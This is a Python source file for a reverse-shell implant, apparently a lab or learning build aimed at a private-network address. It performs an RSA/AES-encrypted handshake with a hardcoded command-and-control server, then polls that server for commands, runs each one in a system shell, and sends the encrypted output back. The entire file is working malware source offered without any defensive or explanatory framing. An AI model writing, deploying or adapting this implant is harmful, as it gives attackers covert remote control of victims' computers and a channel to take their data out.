import requests
import json
import base64
import os
import sys
import socket
import subprocess
import time
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

C2_HOST = "192.168.157.128"
C2_PORT = 8443
C2_URL = f"http://{C2_HOST}:{C2_PORT}"

DEVICE_ID = socket.gethostname()

base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
key_path = os.path.join(base_path, 'public_key.pem')

with open(key_path, "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

def aes_encrypt(key, plaintext):
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext + encryptor.tag).decode()

def aes_decrypt(key, ciphertext_b64):
    data = base64.b64decode(ciphertext_b64)
    iv = data[:12]
    ciphertext = data[12:-16]
    tag = data[-16:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext).decode()

def do_handshake():
    print("[*] Loading RSA public key...")

    print("[*] Generating random AES key...")
    aes_key = os.urandom(32)

    print("[*] Encrypting AES key with RSA...")
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    handshake_data = {
        'device_id': DEVICE_ID,
        'encrypted_aes_key': base64.b64encode(encrypted_aes_key).decode()
    }

    print(f"[*] Sending handshake to {C2_URL}/handshake...")
    response = requests.post(
        f"{C2_URL}/handshake",
        json=handshake_data,
        timeout=10
    )

    if response.status_code == 200:
        print("[+] Handshake successful!")
        return aes_key
    else:
        print(f"[-] Handshake failed: {response.status_code}")
        print(f"[-] Response: {response.text}")
        return None


def send_encrypted_request(aes_key, endpoint, payload):
    payload['device_id'] = DEVICE_ID
    encrypted_payload = aes_encrypt(aes_key, json.dumps(payload))

    headers = {
        'X-Device-ID': DEVICE_ID,
        'Content-Type': 'application/json'
    }

    response = requests.post(
        f"{C2_URL}/{endpoint}",
        json={'data': encrypted_payload},
        headers=headers,
        timeout=30
    )

    if response.status_code == 200:
        decrypted = aes_decrypt(aes_key, response.json()['data'])
        return json.loads(decrypted)
    else:
        return {'status': 'error', 'code': response.status_code}


def get_command(aes_key):
    result = send_encrypted_request(aes_key, 'recv', {'type': 'get_command'})
    return result.get('command', '')


def send_output(aes_key, output, exit_code):
    """Send command output back to C2."""
    return send_encrypted_request(aes_key, 'send', {
        'output': output,
        'exit_code': exit_code
    })

def execute_command(command):
    """Execute a system command and return output."""
    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        output = proc.stdout + proc.stderr
        if not output:
            output = "[Command executed with no output]"
        return output, proc.returncode
    except subprocess.TimeoutExpired:
        return "[Command timed out after 60 seconds]", -1
    except Exception as e:
        return f"[Error: {e}]", -1

def main():
    print(f"[*] Reverse Shell Implant - Device: {DEVICE_ID}")
    print(f"[*] C2 Server: {C2_URL}")

    aes_key = do_handshake()
    if not aes_key:
        print("[-] Handshake failed. Exiting.")
        sys.exit(1)

    print("[*] Waiting for commands...")

    while True:
        try:
            command = get_command(aes_key)

            if not command:
                time.sleep(2)
                continue

            if command.lower() == 'exit':
                print("[*] Exit command received. Shutting down...")
                break

            print(f"[*] Executing: {command}")
            output, exit_code = execute_command(command)

            send_output(aes_key, output, exit_code)
            print(f"[+] Output sent ({len(output)} bytes)")

        except KeyboardInterrupt:
            print("\n[*] Interrupted. Exiting...")
            break
        except Exception as e:
            print(f"[-] Error in main loop: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()